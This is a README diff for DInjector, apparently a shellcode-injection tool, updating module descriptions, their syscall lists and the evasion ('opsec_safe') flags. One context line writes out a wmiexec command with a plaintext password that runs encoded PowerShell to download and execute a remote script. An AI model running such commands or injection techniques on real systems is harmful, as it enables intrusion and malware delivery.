@@ -114,13 +114,13 @@ references:
 ~$ wmiexec.py -silentcommand -nooutput administrator:'Passw0rd!'@192.168.1.11 "powershell -enc $(echo -n 'Invoke-WmiMethod Win32_Process -Name Create -ArgumentList ("powershell -enc '`echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`'")' | iconv -t UTF-16LE | base64 -w0)"
 ```
 
-### [FunctionPointerV2](/DInjector/Modules/FunctionPointerV2.cs)
+### [FunctionPointerUnsafe](/DInjector/Modules/FunctionPointerUnsafe.cs)
 
 ```yaml
-module_name: 'functionpointerv2'
+module_name: 'functionpointerunsafe'
 arguments:
 description: |
-  Sets RX on a byte array and executes it like a function.
+  Sets RX on a byte array (treated as an unsafe pointer) and executes it like a function.
 api:
   - syscalls:
     1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
@@ -129,6 +129,20 @@ references:
   - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-1/'
   - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-2/'
   - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
+```
+
+### [MSILAddressLeak](/DInjector/Modules/MSILAddressLeak.cs)
+
+```yaml
+module_name: 'msiladdressleak'
+arguments:
+description: |
+  Leaks address of the shellcode byte array with MSIL and executes it like a function.
+api:
+opsec_safe: true
+references:
+  - 'https://www.cybermongol.ca/operator-research/dump-lsass-with-sharpminidump-ntfs-transactions-uac-bypass-exfil-dmp-file-to-dropbox'
+  - 'https://github.com/PorLaCola25/TransactedSharpMiniDump/blob/master/SharpMiniDump/Msil.cs'
 ```
 
 ### [ClipboardPointer](/DInjector/Modules/ClipboardPointer.cs)
@@ -159,13 +173,12 @@ description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
 api:
-  - dynamic:
-    1: 'CloseHandle'
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     3: 'NtCreateThreadEx'
     4: 'NtWaitForSingleObject'
+    5: 'NtClose'
 opsec_safe: false
 references:
   - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
@@ -200,14 +213,13 @@ description: |
   Injects shellcode into an existing remote process.
   Thread execution via NtCreateThreadEx.
 api:
-  - dynamic:
-    1: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtOpenProcess'
     2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory (shellcode)'
     4: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     5: 'NtCreateThreadEx'
+    6: 'NtClose (x2)'
 opsec_safe: false
 references:
   - 'https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/SharpImpersonation/Shellcode.cs'
@@ -224,13 +236,12 @@ description: |
   Injects shellcode into an existing remote process overwriting one of its loaded modules' .text section.
   Thread execution via NtCreateThreadEx.
 api:
-  - dynamic:
-    1: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtOpenProcess'
     2: 'NtWriteVirtualMemory (shellcode)'
     3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     4: 'NtCreateThreadEx'
+    5: 'NtClose (x2)'
 opsec_safe:
 references:
   - 'https://www.netero1010-securitylab.com/eavsion/alternative-process-injection'
@@ -248,13 +259,13 @@ description: |
 api:
   - dynamic_invocation:
     1: 'RtlCreateUserThread'
-    2: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtOpenProcess'
     2: 'NtCreateSection (PAGE_EXECUTE_READWRITE)'
     3: 'NtMapViewOfSection (PAGE_READWRITE)'
     4: 'NtMapViewOfSection (PAGE_EXECUTE_READ)'
     5: 'NtUnmapViewOfSection'
+    6: 'NtClose (x2)'
 opsec_safe: false
 references:
   - 'https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs'
@@ -271,8 +282,6 @@ description: |
   After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
   Thread execution via NtCreateThreadEx.
 api:
-  - dynamic:
-    1: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtOpenProcess'
     2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
@@ -281,6 +290,7 @@ api:
     5: 'NtCreateThreadEx (CREATE_SUSPENDED)'
     6: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     7: 'NtResumeThread'
+    8: 'NtClose (x2)'
 opsec_safe: true
 references:
   - 'https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/'
@@ -300,7 +310,6 @@ api:
   - dynamic_invocation:
      1: 'FindWindowExA'
      2: 'SendMessageA'
-     3: 'CloseHandle (x2)'
   - syscalls:
      1: 'NtOpenProcess'
      2: 'NtQueryInformationProcess'
@@ -313,6 +322,7 @@ api:
      9: 'NtProtectVirtualMemory (PAGE_READWRITE)'
     10: 'NtWriteVirtualMemory (origData)'
     11: 'NtProtectVirtualMemory (oldProtect)'
+    12: 'NtClose (x2)'
 opsec_safe:
 references:
   - 'https://t0rchwo0d.github.io/windows/Windows-Process-Injection-Technique-KernelCallbackTable/'
@@ -337,7 +347,6 @@ api:
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-    5: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory (shellcode)'
@@ -345,6 +354,7 @@ api:
     4: 'NtOpenThread'
     5: 'NtQueueApcThread'
     6: 'NtAlertResumeThread'
+    7: 'NtClose (x2)'
 opsec_safe: true
 references:
   - 'https://rastamouse.me/exploring-process-injection-opsec-part-2/'
@@ -368,7 +378,6 @@ api:
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-    5: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory (shellcode)'
@@ -377,6 +386,7 @@ api:
     5: 'GetThreadContext'
     6: 'SetThreadContext'
     7: 'NtResumeThread'
+    8: 'NtClose (x2)'
 opsec_safe: true
 references:
   - 'https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/'
@@ -400,7 +410,6 @@ api:
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-    5: 'CloseHandle (x2)'
   - syscalls:
     1: 'NtQueryInformationProcess'
     2: 'NtReadVirtualMemory (ptrImageBaseAddress)'
@@ -408,6 +417,7 @@ api:
     4: 'NtWriteVirtualMemory (shellcode)'
     5: 'NtProtectVirtualMemory (oldProtect)'
     6: 'NtResumeThread'
+    7: 'NtClose (x2)'
 opsec_safe: false
 references:
   - 'https://github.com/CCob/SharpBlock/blob/master/Program.cs'
@@ -432,7 +442,6 @@ api:
      2: 'UpdateProcThreadAttribute (blockDLLs)'
      3: 'UpdateProcThreadAttribute (PPID)'
      4: 'CreateProcessA'
-     5: 'CloseHandle (x3)'
   - syscalls:
      1: 'NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)'
      2: 'NtAllocateVirtualMemory (shim, PAGE_READWRITE)'
@@ -447,6 +456,7 @@ api:
     11: 'NtWriteVirtualMemory (shellcode)'
     12: 'NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)'
     13: 'NtCreateThreadEx (shellcode)'
+    14: 'NtClose (x3)'
 opsec_safe: true
 references:
   - 'https://offensivedefence.co.uk/posts/module-stomping/'
